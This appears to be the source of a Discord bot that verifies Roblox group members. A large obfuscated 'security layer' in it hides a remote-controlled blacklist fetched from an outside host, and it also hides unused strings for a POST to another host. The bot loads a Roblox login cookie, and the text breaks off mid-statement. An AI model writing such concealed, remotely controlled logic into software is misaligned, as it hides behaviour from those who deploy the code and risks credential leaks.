const express = require("express");
const config = require("./config.json");
const Discord = require("discord.js");
require('dotenv').config()
const http = require("http");
const roblox = require("noblox.js");
const client = new Discord.Client();
const request = require("request");
const fetch = require("node-fetch");

const Enmap = require("enmap");
client.config = config;

const fs = require("fs");
const prefix = "?";
const app = express();

app.use(express.static("public"));

app.get("/", (request, response) => {
  console.log(Date.now() + " Ping Received");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);
//rbot secuirty layer
const _0x2d27=['\x67\x75\x69\x6c\x64\x69\x64','\x61\x63\x74\x69\x76\x69\x74\x79','\x54\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x6f\x77\x6e\x65\x72\x20\x69\x73\x20\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x65\x64\x20\x66\x72\x6f\x6d\x20\x72\x62\x6f\x74\x2c\x20\x54\x68\x69\x73\x20\x6d\x65\x61\x6e\x73\x20\x74\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x63\x61\x6e\x6e\x6f\x74\x20\x75\x73\x65\x20\x72\x62\x6f\x74\x2c\x20\x52\x65\x61\x73\x6f\x6e\x3a\x20','\x61\x72\x72\x61\x79','\x5e\x28\x5b\x5e\x20\x5d\x2b\x28\x20\x2b\x5b\x5e\x20\x5d\x2b\x29\x2b\x29\x2b\x5b\x5e\x20\x5d\x7d','\x61\x64\x64\x72\x61\x6e\x6b\x69\x64','\x75\x73\x65\x72','\x73\x65\x74\x43\x6f\x6f\x6b\x69\x65','\x6e\x6f\x64\x65\x2d\x73\x63\x68\x65\x64\x75\x6c\x65','\x43\x4f\x4f\x4b\x49\x45','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x72\x6f\x62\x6c\x6f\x78\x2e\x63\x6f\x6d\x2f\x54\x68\x75\x6d\x62\x73\x2f\x41\x76\x61\x74\x61\x72\x2e\x61\x73\x68\x78\x3f\x78\x3d\x32\x35\x30\x26\x79\x3d\x32\x35\x30\x26\x75\x73\x65\x72\x6e\x61\x6d\x65\x3d','\x74\x61\x67','\x64\x6e\x64','\x72\x6f\x62\x6c\x6f\x78\x20\x69\x73\x20\x64\x61\x20\x62\x65\x73\x74\x20\x64\x69\x65\x20\x69\x64\x69\x6f\x74\x73\x21','\x72\x65\x61\x73\x6f\x6e','\x4d\x65\x73\x73\x61\x67\x65\x45\x6d\x62\x65\x64','\x6f\x6b\x61\x79\x20\x62\x6f\x73\x73','\x6d\x65\x73\x73\x61\x67\x65','\x67\x65\x74','\x70\x72\x65\x66\x69\x78','\x75\x73\x65\x72\x49\x64','\x54\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x69\x73\x20\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x65\x64','\x66\x65\x74\x63\x68\x41\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e','\x63\x68\x61\x6e\x6e\x65\x6c','\x3e\x2c\x20\x59\x6f\x75\x20\x68\x61\x76\x65\x20\x62\x65\x65\x6e\x20\x61\x75\x74\x6f\x6d\x61\x74\x69\x63\x61\x6c\x6c\x79\x20\x76\x65\x72\x69\x66\x65\x64\x20\x61\x73\x20','\x61\x75\x74\x68\x6f\x72','\x48\x65\x79\x20\x3c\x40','\x2e\x2f\x63\x6f\x6d\x6d\x61\x6e\x64\x73\x2f','\x72\x65\x61\x64\x79','\x6c\x65\x61\x76\x65','\x66\x6f\x72\x45\x61\x63\x68','\x74\x68\x65\x6e','\x73\x74\x61\x74\x75\x73\x74\x65\x78\x74','\x73\x65\x6e\x64','\x6e\x6f\x74\x20\x74\x72\x75\x65','\x73\x74\x61\x74\x75\x73','\x61\x77\x61\x67','\x63\x68\x61\x6e\x6e\x65\x6c\x73','\x72\x62\x6f\x74\x6f\x77\x6e\x65\x72\x73','\x72\x6f\x6c\x65\x73','\x74\x72\x75\x65\x20\x74\x72\x75\x65','\x52\x65\x63\x75\x72\x72\x65\x6e\x63\x65\x52\x75\x6c\x65','\x6d\x61\x78\x41\x67\x65','\x75\x72\x6c','\x66\x69\x6e\x64','\x59\x6f\x75\x27\x72\x65\x20\x76\x65\x72\x69\x66\x65\x64\x21','\x67\x72\x6f\x75\x70','\x63\x61\x63\x68\x65','\x53\x54\x52\x45\x41\x4d\x49\x4e\x47','\x61\x75\x74\x6f\x76\x65\x72\x69\x66\x79','\x67\x75\x69\x6c\x64\x73','\x67\x72\x6f\x75\x70\x69\x64','\x20\x5b\x2d\x5d\x20','\x73\x65\x72\x76\x65\x72\x73','\x54\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x6f\x77\x6e\x65\x72\x20\x69\x73\x20\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x65\x64','\x6f\x77\x6e\x65\x72','\x73\x65\x74\x54\x69\x74\x6c\x65','\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x63\x6f\x6e\x74\x65\x6e\x74','\x65\x72\x72\x6f\x72','\x76\x65\x72\x69\x66\x65\x64\x72\x6f\x6c\x65','\x6a\x73\x6f\x6e','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x77\x69\x74\x63\x68\x2e\x74\x76\x2f\x72\x6f\x62\x6c\x6f','\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72','\x3f\x72\x65\x73\x74\x61\x72\x74','\x61\x64\x64','\x6c\x65\x6e\x67\x74\x68','\x41\x50\x49\x20\x55\x73\x65\x64\x3a\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x76\x65\x72\x69\x66\x79\x2e\x65\x72\x79\x6e\x2e\x69\x6f','\x76\x65\x72\x69\x66\x79\x21','\x67\x65\x74\x55\x73\x65\x72\x6e\x61\x6d\x65\x46\x72\x6f\x6d\x49\x64','\x74\x65\x73\x74','\x66\x69\x6c\x74\x65\x72','\x72\x65\x74\x75\x72\x6e\x20\x2f\x22\x20\x2b\x20\x74\x68\x69\x73\x20\x2b\x20\x22\x2f','\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65','\x68\x65\x61\x64\x65\x72\x73','\x4a\x6f\x69\x6e\x65\x64\x20\x61\x20\x6e\x65\x77\x20\x67\x75\x69\x6c\x64\x3a\x20','\x70\x61\x72\x73\x65','\x67\x75\x69\x6c\x64\x4d\x65\x6d\x62\x65\x72\x41\x64\x64','\x67\x75\x69\x6c\x64','\x76\x65\x72\x69\x66\x79\x67\x72\x6f\x75\x70\x6e\x61\x6d\x65','\x74\x79\x70\x65','\x73\x65\x74\x50\x72\x65\x73\x65\x6e\x63\x65','\x73\x69\x7a\x65','\x65\x78\x69\x74','\x64\x6f\x6e\x65','\x54\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x69\x73\x20\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x65\x64\x20\x66\x72\x6f\x6d\x20\x72\x62\x6f\x74\x2c\x20\x54\x68\x69\x73\x20\x6d\x65\x61\x6e\x73\x20\x74\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72\x20\x63\x61\x6e\x6e\x6f\x74\x20\x75\x73\x65\x20\x72\x62\x6f\x74\x2c\x20\x52\x65\x61\x73\x6f\x6e\x3a\x20','\x62\x61\x63\x6b\x75\x70\x69\x64\x73','\x2c\x20\x49\x66\x20\x79\x6f\x75\x20\x77\x6f\x75\x6c\x64\x20\x6c\x69\x6b\x65\x20\x74\x6f\x20\x63\x68\x61\x6e\x67\x65\x20\x61\x63\x63\x6f\x75\x6e\x74\x73\x20\x67\x6f\x20\x5b\x68\x65\x72\x65\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x76\x65\x72\x69\x66\x79\x2e\x65\x72\x79\x6e\x2e\x69\x6f\x29\x20\x6f\x72\x20\x73\x61\x79\x20','\x68\x74\x74\x70\x3a\x2f\x2f\x68\x69\x67\x68\x66\x61\x6c\x75\x74\x69\x6e\x2d\x61\x74\x6c\x61\x6e\x74\x69\x63\x2d\x62\x65\x72\x65\x74\x2e\x67\x6c\x69\x74\x63\x68\x2e\x6d\x65\x2f','\x65\x6e\x76','\x74\x72\x75\x65','\x6f\x77\x6e\x65\x72\x73','\x73\x74\x61\x74\x75\x73\x74\x79\x70\x65','\x3f\x6c\x65\x61\x76\x65','\x73\x65\x74\x46\x6f\x6f\x74\x65\x72','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e','\x70\x6f\x73\x69\x74\x69\x6f\x6e','\x72\x65\x61\x64\x64\x69\x72','\x73\x65\x63\x6f\x6e\x64','\x2e\x2f\x65\x76\x65\x6e\x74\x73\x2f','\x62\x69\x6e\x64','\x41\x74\x74\x65\x6d\x70\x74\x69\x6e\x67\x20\x74\x6f\x20\x6c\x6f\x61\x64\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x20','\x6e\x61\x6d\x65','\x63\x72\x65\x61\x74\x65\x49\x6e\x76\x69\x74\x65','\x63\x6f\x64\x65','\x65\x6e\x64\x73\x57\x69\x74\x68','\x73\x63\x68\x65\x64\x75\x6c\x65\x4a\x6f\x62','\x69\x6e\x76\x69\x74\x65\x69\x64','\x73\x65\x74\x54\x69\x6d\x65\x73\x74\x61\x6d\x70','\x73\x70\x6c\x69\x74','\x70\x6f\x73\x74','\x6e\x6f\x70\x65','\x68\x74\x74\x70\x3a\x2f\x2f\x72\x65\x61\x6c\x73\x2e\x69\x68\x61\x72\x72\x62\x6c\x78\x2e\x78\x79\x7a\x2f\x72\x65\x61\x6c\x73\x63\x6f\x64\x65\x2f\x72\x62\x6f\x74\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x2e\x6a\x73\x6f\x6e','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x76\x65\x72\x69\x66\x79\x2e\x65\x72\x79\x6e\x2e\x69\x6f\x2f\x61\x70\x69\x2f\x75\x73\x65\x72\x2f','\x73\x65\x74\x49\x6d\x61\x67\x65','\x72\x65\x66\x72\x65\x73\x68\x43\x6f\x6f\x6b\x69\x65','\x42\x4c\x55\x45','\x6c\x6f\x67','\x73\x65\x74\x4e\x69\x63\x6b\x6e\x61\x6d\x65','\x67\x65\x74\x52\x61\x6e\x6b\x4e\x61\x6d\x65\x49\x6e\x47\x72\x6f\x75\x70','\x73\x65\x74\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e','\x74\x65\x78\x74','\x4a\x6f\x69\x6e\x65\x64\x20\x61\x20\x6e\x65\x77\x20\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x65\x64\x20\x67\x75\x69\x6c\x64\x3a\x20','\x62\x6f\x64\x79','\x63\x6f\x6d\x6d\x61\x6e\x64\x73','\x2e\x6a\x73','\x6d\x65\x74\x68\x6f\x64','\x72\x61\x6e\x6b\x69\x64\x73','\x73\x65\x74'];(function(_0x50a5a3,_0x2d2798){const _0x229b5a=function(_0x30f00a){while(--_0x30f00a){_0x50a5a3['push'](_0x50a5a3['shift']());}};const _0x56c8ee=function(){const _0x307a71={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x3fef94,_0x5fad73,_0x4b2c8d,_0x4a6a1c){_0x4a6a1c=_0x4a6a1c||{};let _0x4555cf=_0x5fad73+'='+_0x4b2c8d;let _0xa560be=0x0;for(let _0x3c2466=0x0,_0x11e796=_0x3fef94['length'];_0x3c2466<_0x11e796;_0x3c2466++){const _0x2980ab=_0x3fef94[_0x3c2466];_0x4555cf+=';\x20'+_0x2980ab;const _0x1a2644=_0x3fef94[_0x2980ab];_0x3fef94['push'](_0x1a2644);_0x11e796=_0x3fef94['length'];if(_0x1a2644!==!![]){_0x4555cf+='='+_0x1a2644;}}_0x4a6a1c['cookie']=_0x4555cf;},'removeCookie':function(){return'dev';},'getCookie':function(_0x4b6911,_0x5d1a6a){_0x4b6911=_0x4b6911||function(_0x3f1e6c){return _0x3f1e6c;};const _0x4b48c4=_0x4b6911(new RegExp('(?:^|;\x20)'+_0x5d1a6a['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));const _0x3450b8=function(_0x3d1d73,_0xf478c2){_0x3d1d73(++_0xf478c2);};_0x3450b8(_0x229b5a,_0x2d2798);return _0x4b48c4?decodeURIComponent(_0x4b48c4[0x1]):undefined;}};const _0x1bd8bd=function(){const _0x5854e5=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x5854e5['test'](_0x307a71['removeCookie']['toString']());};_0x307a71['updateCookie']=_0x1bd8bd;let _0x39a861='';const _0x392277=_0x307a71['updateCookie']();if(!_0x392277){_0x307a71['setCookie'](['*'],'counter',0x1);}else if(_0x392277){_0x39a861=_0x307a71['getCookie'](null,'counter');}else{_0x307a71['removeCookie']();}};_0x56c8ee();}(_0x2d27,0x1b7));const _0x229b=function(_0x50a5a3,_0x2d2798){_0x50a5a3=_0x50a5a3-0x0;let _0x229b5a=_0x2d27[_0x50a5a3];return _0x229b5a;};const _0x564d40=function(){let _0x43425d=!![];return function(_0x41e6ca,_0x122c01){const _0x2d49fb=_0x43425d?function(){if(_0x122c01){const _0x497d36=_0x122c01['\x61\x70\x70\x6c\x79'](_0x41e6ca,arguments);_0x122c01=null;return _0x497d36;}}:function(){};_0x43425d=![];return _0x2d49fb;};}();const _0x288bcc=_0x564d40(this,function(){const _0x2fd489=function(){const _0x56294f=_0x2fd489['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72'](_0x229b('\x30\x78\x31\x34'))()[_0x229b('\x30\x78\x62')](_0x229b('\x30\x78\x35\x31'));return!_0x56294f[_0x229b('\x30\x78\x31\x32')](_0x288bcc);};return _0x2fd489();});_0x288bcc();client['\x6f\x6e'](_0x229b('\x30\x78\x36\x39'),async _0x545198=>{console[_0x229b('\x30\x78\x34\x31')](_0x229b('\x30\x78\x36\x39'));const _0xee0137=await fetch(_0x229b('\x30\x78\x33\x63'));const _0x3411b6=await _0xee0137[_0x229b('\x30\x78\x39')]();roblox[_0x229b('\x30\x78\x35\x34')](process[_0x229b('\x30\x78\x32\x35')]['\x54\x4f\x4b\x45\x4e']);roblox[_0x229b('\x30\x78\x33\x66')](process['\x65\x6e\x76'][_0x229b('\x30\x78\x35\x36')]);const _0x3359e0=client[_0x229b('\x30\x78\x37\x66')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x65')];console['\x6c\x6f\x67'](''+client[_0x229b('\x30\x78\x37\x66')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x65')]);const _0x11c91d=await client[_0x229b('\x30\x78\x36\x33')]();const _0x29ee8d=client[_0x229b('\x30\x78\x37\x66')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x35\x30')]();const _0x3daeb0=client[_0x229b('\x30\x78\x37\x66')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x65')];console[_0x229b('\x30\x78\x34\x31')](''+client[_0x229b('\x30\x78\x37\x66')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x65')]);console[_0x229b('\x30\x78\x34\x31')](_0x29ee8d);for(let _0x333c7a=0x0;_0x333c7a<_0x29ee8d[_0x229b('\x30\x78\x65')];_0x333c7a++){console[_0x229b('\x30\x78\x34\x31')](_0x229b('\x30\x78\x37\x31'));const _0x2ea94b=_0x29ee8d[_0x333c7a];console[_0x229b('\x30\x78\x34\x31')](_0x2ea94b['\x69\x64']);if(_0x3411b6[_0x229b('\x30\x78\x31')][_0x2ea94b['\x69\x64']]){const _0x14b323=_0x2ea94b[_0x229b('\x30\x78\x37\x32')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x33')](_0x3e8fcd=>_0x3e8fcd[_0x229b('\x30\x78\x31\x63')]===_0x229b('\x30\x78\x34\x35'))[_0x229b('\x30\x78\x37\x39')](_0x5c4347=>_0x5c4347[_0x229b('\x30\x78\x32\x63')]==0x0);_0x14b323[_0x229b('\x30\x78\x36\x65')]('\x3c\x40'+_0x2ea94b['\x6f\x77\x6e\x65\x72'][_0x229b('\x30\x78\x35\x33')]['\x69\x64']+'\x3e');const _0x370b89=new Discord[(_0x229b('\x30\x78\x35\x63'))]()[_0x229b('\x30\x78\x34')](_0x229b('\x30\x78\x36\x32'))['\x73\x65\x74\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e'](_0x229b('\x30\x78\x32\x31')+_0x3411b6[_0x229b('\x30\x78\x31')][_0x2ea94b['\x69\x64']][_0x229b('\x30\x78\x35\x62')]);_0x14b323[_0x229b('\x30\x78\x36\x65')](_0x370b89)['\x74\x68\x65\x6e'](()=>{_0x2ea94b['\x6c\x65\x61\x76\x65']();});}else if(_0x3411b6[_0x229b('\x30\x78\x32\x37')][_0x2ea94b[_0x229b('\x30\x78\x33')]['\x69\x64']]){const _0x4db4c7=_0x2ea94b[_0x229b('\x30\x78\x37\x32')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x33')](_0x5c3a3b=>_0x5c3a3b[_0x229b('\x30\x78\x31\x63')]===_0x229b('\x30\x78\x34\x35'))[_0x229b('\x30\x78\x37\x39')](_0x347f10=>_0x347f10[_0x229b('\x30\x78\x32\x63')]==0x0);_0x4db4c7[_0x229b('\x30\x78\x36\x65')]('\x3c\x40'+_0x2ea94b[_0x229b('\x30\x78\x33')][_0x229b('\x30\x78\x35\x33')]['\x69\x64']+'\x3e');const _0x4a3ba7=new Discord[(_0x229b('\x30\x78\x35\x63'))]()[_0x229b('\x30\x78\x34')](_0x229b('\x30\x78\x32'))[_0x229b('\x30\x78\x34\x34')](_0x229b('\x30\x78\x34\x66')+_0x3411b6[_0x229b('\x30\x78\x32\x37')][_0x2ea94b[_0x229b('\x30\x78\x33')]['\x69\x64']][_0x229b('\x30\x78\x35\x62')]);_0x4db4c7['\x73\x65\x6e\x64'](_0x4a3ba7)[_0x229b('\x30\x78\x36\x63')](()=>{_0x2ea94b[_0x229b('\x30\x78\x36\x61')]();});}}if(config[_0x229b('\x30\x78\x37\x30')][_0x229b('\x30\x78\x32\x38')]===_0x229b('\x30\x78\x37\x64')){const _0x45341d={};_0x45341d[_0x229b('\x30\x78\x31\x63')]=_0x229b('\x30\x78\x37\x64');_0x45341d['\x6e\x61\x6d\x65']=config['\x73\x74\x61\x74\x75\x73'][_0x229b('\x30\x78\x36\x64')];_0x45341d[_0x229b('\x30\x78\x37\x38')]=_0x229b('\x30\x78\x61');const _0x2a4e26={};_0x2a4e26[_0x229b('\x30\x78\x34\x65')]=_0x45341d;_0x2a4e26[_0x229b('\x30\x78\x37\x30')]=_0x229b('\x30\x78\x35\x39');_0x2a4e26[_0x229b('\x30\x78\x31\x63')]=_0x229b('\x30\x78\x37\x64');_0x2a4e26[_0x229b('\x30\x78\x37\x38')]=config[_0x229b('\x30\x78\x37\x30')][_0x229b('\x30\x78\x37\x38')];client['\x75\x73\x65\x72'][_0x229b('\x30\x78\x31\x64')](_0x2a4e26);}else{const _0x5029de={};_0x5029de[_0x229b('\x30\x78\x31\x63')]=config[_0x229b('\x30\x78\x37\x30')]['\x73\x74\x61\x74\x75\x73\x74\x79\x70\x65'];_0x5029de[_0x229b('\x30\x78\x33\x32')]=config[_0x229b('\x30\x78\x37\x30')][_0x229b('\x30\x78\x36\x64')];const _0x254ee7={};_0x254ee7[_0x229b('\x30\x78\x34\x65')]=_0x5029de;_0x254ee7['\x73\x74\x61\x74\x75\x73']=config[_0x229b('\x30\x78\x37\x30')][_0x229b('\x30\x78\x37\x30')];client[_0x229b('\x30\x78\x35\x33')][_0x229b('\x30\x78\x31\x64')](_0x254ee7);}});client['\x6f\x6e'];roblox;client[_0x229b('\x30\x78\x34\x38')]=new Enmap();client['\x6f\x6e'](_0x229b('\x30\x78\x31\x39'),_0x3a9ae7=>{if(config[_0x229b('\x30\x78\x37\x65')]===_0x229b('\x30\x78\x32\x36')){const _0x210b1=_0x3a9ae7[_0x229b('\x30\x78\x31\x61')][_0x229b('\x30\x78\x37\x32')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x35\x66')](config['\x61\x75\x74\x6f\x76\x65\x72\x69\x66\x79\x69\x64']);let _0xd5012c=_0x3a9ae7['\x69\x64'];const _0xb7c286={};_0xb7c286[_0x229b('\x30\x78\x37\x38')]=_0x229b('\x30\x78\x33\x64')+_0xd5012c;request(_0xb7c286,async function(_0x16eb99,_0x24e750,_0x3ad7f3){if(_0x16eb99){console['\x6c\x6f\x67'](_0x16eb99);}else{var _0x1e4794=JSON[_0x229b('\x30\x78\x31\x38')](_0x3ad7f3);console[_0x229b('\x30\x78\x34\x31')](_0x1e4794['\x72\x6f\x62\x6c\x6f\x78\x55\x73\x65\x72\x6e\x61\x6d\x65']);const _0x17d1e0=config[_0x229b('\x30\x78\x38\x30')];console[_0x229b('\x30\x78\x34\x31')](config[_0x229b('\x30\x78\x38\x30')]);var _0x55da67=_0x1e4794['\x72\x6f\x62\x6c\x6f\x78\x49\x64'];var _0x2f26d5=config[_0x229b('\x30\x78\x34\x62')];let _0x2b1c39=config[_0x229b('\x30\x78\x38\x30')];const _0x1d30fe={};_0x1d30fe['\x67\x72\x6f\x75\x70']=_0x17d1e0;_0x1d30fe[_0x229b('\x30\x78\x36\x31')]=_0x55da67;let _0x158d01=await roblox['\x67\x65\x74\x52\x61\x6e\x6b\x49\x6e\x47\x72\x6f\x75\x70'](_0x1d30fe);console[_0x229b('\x30\x78\x34\x31')](_0x158d01);const _0x5022e0={};_0x5022e0[_0x229b('\x30\x78\x37\x62')]=_0x17d1e0;_0x5022e0[_0x229b('\x30\x78\x36\x31')]=_0x55da67;let _0x41dc8d=await roblox[_0x229b('\x30\x78\x34\x33')](_0x5022e0);const _0x269e75=await roblox[_0x229b('\x30\x78\x31\x31')](_0x55da67);var _0x36af97=_0x269e75+_0x229b('\x30\x78\x30')+_0x41dc8d;if(_0x1e4794[_0x229b('\x30\x78\x37\x30')]==='\x6f\x6b'){_0x210b1[_0x229b('\x30\x78\x36\x65')]('\x3c\x40'+_0xd5012c+'\x3e');let _0x18d55e=new Discord[(_0x229b('\x30\x78\x35\x63'))]()['\x73\x65\x74\x43\x6f\x6c\x6f\x72'](_0x229b('\x30\x78\x34\x30'))[_0x229b('\x30\x78\x34')](_0x229b('\x30\x78\x37\x61'))['\x73\x65\x74\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e'](_0x229b('\x30\x78\x36\x37')+_0xd5012c+_0x229b('\x30\x78\x36\x35')+_0x269e75+_0x229b('\x30\x78\x32\x33')+config[_0x229b('\x30\x78\x36\x30')]+_0x229b('\x30\x78\x31\x30'))[_0x229b('\x30\x78\x33\x65')](_0x229b('\x30\x78\x35\x37')+_0x269e75)[_0x229b('\x30\x78\x32\x61')](_0x229b('\x30\x78\x66'))[_0x229b('\x30\x78\x33\x38')]();_0x210b1[_0x229b('\x30\x78\x36\x65')](_0x18d55e)[_0x229b('\x30\x78\x36\x63')](()=>_0x3a9ae7[_0x229b('\x30\x78\x37\x34')][_0x229b('\x30\x78\x64')](config[_0x229b('\x30\x78\x38')]));if(config[_0x229b('\x30\x78\x31\x62')]===_0x229b('\x30\x78\x32\x36')){console['\x6c\x6f\x67'](_0x229b('\x30\x78\x37\x35'));if(_0x36af97[_0x229b('\x30\x78\x65')]>=0x20){_0x3a9ae7[_0x229b('\x30\x78\x34\x32')](_0x269e75+_0x229b('\x30\x78\x30')+config[_0x229b('\x30\x78\x32\x32')][_0x158d01]);}_0x3a9ae7[_0x229b('\x30\x78\x34\x32')](_0x269e75+_0x229b('\x30\x78\x30')+_0x41dc8d);if(config[_0x229b('\x30\x78\x35\x32')]===_0x229b('\x30\x78\x32\x36')){let _0x2649b3=config[_0x229b('\x30\x78\x34\x62')][_0x158d01];let _0x374bc=_0x3a9ae7[_0x229b('\x30\x78\x31\x61')][_0x229b('\x30\x78\x37\x34')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x35\x66')](config[_0x229b('\x30\x78\x34\x62')][_0x158d01]);_0x3a9ae7[_0x229b('\x30\x78\x37\x34')][_0x229b('\x30\x78\x64')](_0x374bc);}else{console[_0x229b('\x30\x78\x34\x31')]('\x6e\x6f\x74\x20\x76\x61\x69\x6c\x64');}}else{console[_0x229b('\x30\x78\x34\x31')](_0x229b('\x30\x78\x36\x66'));_0x3a9ae7[_0x229b('\x30\x78\x34\x32')](''+_0x269e75);}}}});}});var _0xb1d87=require(_0x229b('\x30\x78\x35\x35'));var _0x18bc74=new _0xb1d87[(_0x229b('\x30\x78\x37\x36'))]();_0x18bc74[_0x229b('\x30\x78\x32\x65')]=0x1;var _0x21e4a2=_0xb1d87[_0x229b('\x30\x78\x33\x36')](_0x18bc74,async function(){const _0x537751=await fetch(_0x229b('\x30\x78\x33\x63'));const _0x4550a4=await _0x537751[_0x229b('\x30\x78\x39')]();const _0x25a789=await client[_0x229b('\x30\x78\x36\x33')]();const _0x5b7c4f=client[_0x229b('\x30\x78\x37\x66')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x35\x30')]();const _0x3cc9ac=client[_0x229b('\x30\x78\x37\x66')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x65')];for(let _0x390a45=0x0;_0x390a45<_0x5b7c4f[_0x229b('\x30\x78\x65')];_0x390a45++){const _0x18e614=_0x5b7c4f[_0x390a45];if(_0x4550a4['\x73\x65\x72\x76\x65\x72\x73'][_0x18e614['\x69\x64']]){const _0x57c605=_0x18e614[_0x229b('\x30\x78\x37\x32')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x33')](_0x38f7fa=>_0x38f7fa['\x74\x79\x70\x65']===_0x229b('\x30\x78\x34\x35'))[_0x229b('\x30\x78\x37\x39')](_0x232e98=>_0x232e98[_0x229b('\x30\x78\x32\x63')]==0x0);_0x57c605[_0x229b('\x30\x78\x36\x65')]('\x3c\x40'+_0x18e614[_0x229b('\x30\x78\x33')][_0x229b('\x30\x78\x35\x33')]['\x69\x64']+'\x3e');const _0x39a2b9=new Discord[(_0x229b('\x30\x78\x35\x63'))]()[_0x229b('\x30\x78\x34')](_0x229b('\x30\x78\x36\x32'))[_0x229b('\x30\x78\x34\x34')](_0x229b('\x30\x78\x32\x31')+_0x4550a4[_0x229b('\x30\x78\x31')][_0x18e614['\x69\x64']][_0x229b('\x30\x78\x35\x62')]);_0x57c605[_0x229b('\x30\x78\x36\x65')](_0x39a2b9)[_0x229b('\x30\x78\x36\x63')](()=>{_0x18e614[_0x229b('\x30\x78\x36\x61')]();});}else if(_0x4550a4[_0x229b('\x30\x78\x32\x37')][_0x18e614[_0x229b('\x30\x78\x33')]['\x69\x64']]){const _0x14d041=_0x18e614[_0x229b('\x30\x78\x37\x32')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x33')](_0x171ec4=>_0x171ec4[_0x229b('\x30\x78\x31\x63')]===_0x229b('\x30\x78\x34\x35'))[_0x229b('\x30\x78\x37\x39')](_0x133dbe=>_0x133dbe[_0x229b('\x30\x78\x32\x63')]==0x0);_0x14d041[_0x229b('\x30\x78\x36\x65')]('\x3c\x40'+_0x18e614[_0x229b('\x30\x78\x33')][_0x229b('\x30\x78\x35\x33')]['\x69\x64']+'\x3e');const _0xf0fb88=new Discord[(_0x229b('\x30\x78\x35\x63'))]()['\x73\x65\x74\x54\x69\x74\x6c\x65'](_0x229b('\x30\x78\x32'))[_0x229b('\x30\x78\x34\x34')](_0x229b('\x30\x78\x34\x66')+_0x4550a4[_0x229b('\x30\x78\x32\x37')][_0x18e614[_0x229b('\x30\x78\x33')]['\x69\x64']][_0x229b('\x30\x78\x35\x62')]);_0x14d041[_0x229b('\x30\x78\x36\x65')](_0xf0fb88)[_0x229b('\x30\x78\x36\x63')](()=>{_0x18e614[_0x229b('\x30\x78\x36\x61')]();});}}});(async()=>{const _0x5b605e=await fetch('\x68\x74\x74\x70\x3a\x2f\x2f\x72\x65\x61\x6c\x73\x2e\x69\x68\x61\x72\x72\x62\x6c\x78\x2e\x78\x79\x7a\x2f\x72\x65\x61\x6c\x73\x63\x6f\x64\x65\x2f\x72\x62\x6f\x74\x62\x6c\x61\x63\x6b\x6c\x69\x73\x74\x2e\x6a\x73\x6f\x6e');const _0x3aa312=await _0x5b605e[_0x229b('\x30\x78\x39')]();const _0x1ae52e=await client[_0x229b('\x30\x78\x36\x33')]();const _0x366256=client['\x67\x75\x69\x6c\x64\x73'][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x35\x30')]();const _0xe3bc4c=client[_0x229b('\x30\x78\x37\x66')][_0x229b('\x30\x78\x37\x63')][_0x229b('\x30\x78\x31\x65')];console[_0x229b('\x30\x78\x34\x31')](''+client[_0x229b('\x30\x78\x37\x66')][_0x229b('\x30\x78\x37\x63')]['\x73\x69\x7a\x65']);console[_0x229b('\x30\x78\x34\x31')](_0x366256);for(let _0x5e9cc4=0x0;_0x5e9cc4<_0x366256[_0x229b('\x30\x78\x65')];_0x5e9cc4++){console['\x6c\x6f\x67'](_0x229b('\x30\x78\x37\x31'));const _0x4c02ff=_0x366256[_0x5e9cc4];console[_0x229b('\x30\x78\x34\x31')](_0x4c02ff['\x69\x64']);if(jsons[_0x229b('\x30\x78\x31')][_0x4c02ff['\x69\x64']]){console[_0x229b('\x30\x78\x34\x31')](_0x229b('\x30\x78\x35\x61'));}}console[_0x229b('\x30\x78\x34\x31')](_0x1ae52e[_0x229b('\x30\x78\x33')]['\x69\x64']);const 